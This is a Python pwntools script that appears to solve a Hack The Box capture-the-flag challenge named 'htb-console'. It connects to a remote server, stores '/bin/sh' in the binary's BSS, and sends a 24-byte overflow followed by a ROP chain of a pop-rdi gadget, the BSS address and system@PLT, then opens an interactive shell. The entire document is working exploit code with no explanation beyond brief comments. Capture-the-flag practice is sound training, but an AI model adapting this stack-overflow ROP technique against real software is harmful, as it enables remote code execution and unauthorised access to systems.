from pwn import *
import pwn

# Read notes.txt honestly, there's too much in brain analysis and I've already got a segfault

# The address of CALL SYSTEM is 0x00401381

# The address of SYSTEM@PLT is 0x0000000000401040

# The address of BSS where we write payload is 004040b0

# Address of POP RDI is 0x0000000000401473

#p = process("./htb-console")

p = remote('157.245.44.97',30708) #157.245.44.97:30708

ip1 = p.recv()
print(ip1) # prints the welcome line

# Write shellcode to bss
command = b"hof"
p.sendline(command)

ip3 = p.recv()
print(ip3)

payload_test=b"/bin/sh"
print(payload_test)
p.sendline(payload_test)

#Now we do buffer overflow
command = b"flag"
p.sendline(command)

ip2 = p.recv()
print(ip2) #Prints enter flag line where we send the payload

padding = b"A"*24
ret_addr1 = pwn.p64(0x401473) #This is the pop rdi instruction
ret_addr2 = pwn.p64(0x4040b0) #This is the location in BSS where it is going to execute shellcode
ret_addr3 = pwn.p64(0x401040) #This is the call for system
payload = padding + ret_addr1 + ret_addr2 + ret_addr3

print(payload)
p.sendline(payload)

p.interactive()


